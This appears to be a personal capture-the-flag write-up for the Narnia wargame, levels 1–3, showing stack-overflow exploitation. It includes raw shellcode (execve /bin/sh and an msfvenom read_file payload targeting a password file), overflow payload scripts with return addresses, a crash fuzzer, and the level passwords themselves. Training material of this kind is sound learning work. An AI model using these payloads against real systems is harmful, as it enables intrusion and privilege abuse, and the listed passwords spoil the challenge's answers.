# Python 3
```python
import struct
import sys

pad = b'\x41' * 20
sh = struct.pack("<L",0xdeadbeef)
out = pad + sh
sys.stdout.buffer.write(out)
```
- narnia1:eaa6AjYMBB
---
# Narnia 2
Envirment variable needs to be injected with shellcode.
Shellcode working for this one is:
http://shell-storm.org/shellcode/files/shellcode-607.html
```bash
EGG=$(perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
```
- narnia2:Zzb6MIyceT
---
# Narnia 3
```python
import subprocess

def execute_narnia2_with_argument(argument):
    try:
        # Run the narnia2 program with the specified argument
        result = subprocess.run(["/narnia/narnia2", argument], capture_output=True, text=True, check=True)

        # Check if the output contains "Segmentation fault"
        if "Segmentation fault" in result.stdout:
            return True
        else:
            return False
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return True

def find_segmentation_fault():
    # Start with one character "A" in the argument
    load_argument = "A"
    counter = 1

    while True:
        if execute_narnia2_with_argument(load_argument):
            print(f"Segmentation fault detected with argument: {counter}")
            # Segmentation fault occurred, break the loop
            break
        else:
            # No segmentation fault, increase the argument
            load_argument += "A"
            counter += 1

if __name__ == "__main__":
    find_segmentation_fault()
```

SIZE = 132

```py
from pwn import *
import sys
import struct

context.update(arch='i386', os='linux')

shellcode = shellcraft.sh()

payload = b"\x90"* 91
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += b"B" * 16
payload += struct.pack("I", 0xffffd3a8)
print(len(payload))

with open("payload", "wb") as f:
    f.write(payload)
```
## perl version

- Why is this always jumping out? Seems like a protection is on, when I invoke any shell the spawn of shell drops privileges.
```bash
./narnia2 $(perl -e 'print "\x90" x 91 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" ."B"x 16 . "\xa8\xd3\xff\xff"')

$(perl -e 'print "\x90" x 107 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\xd8\xd3\xff\xff"')
```

- Solution to getting a next level key was to build payload with msfvenom and read it straight from file, no shell succeeded.
```py
# msfvenom -p linux/x86/read_file PATH=/etc/narnia_pass/narnia3 -b "\x00\x0a\x0d\x20" -f py

import sys
import struct

buf = b"\x90"* 15

buf += b"\xda\xcf\xbf\x27\xec\xe7\xa3\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x16\x31\x7d\x19\x83\xed\xfc\x03\x7d"
buf += b"\x15\xc5\x19\x0c\x95\xb1\xe7\xd3\xda\xc1\xbc\xe2"
buf += b"\x13\x0c\xc2\x8c\x67\x36\xc0\x8e\x67\x46\x4e\x69"
buf += b"\xee\xbf\xea\x76\xe1\x3f\x0b\xba\x81\xb6\xc9\xfc"
buf += b"\x86\xc8\xcd\xfc\x3d\xc9\xcd\xfc\x41\x04\x4d\x44"
buf += b"\x40\x96\x4e\xb5\xf8\x96\x4e\xb5\xfe\x5b\xce\x5d"
buf += b"\x3b\x9c\x30\x62\xeb\x07\xbb\xfe\xdb\xa9\x22\x73"
buf += b"\x4a\x5c\xc4\x2c\xe2\xff\x75\xa0\x2d\x91\x18\x34"
buf += b"\x5c\x04\xba\x8b\xa0"

buf += b"B" * 4
buf += struct.pack("I", 0xffffd5f0)
print(len(buf))

with open("buf", "wb") as f:
        f.write(buf)
```

narnia3:8SyQ2wyEDU

# Narnia 4
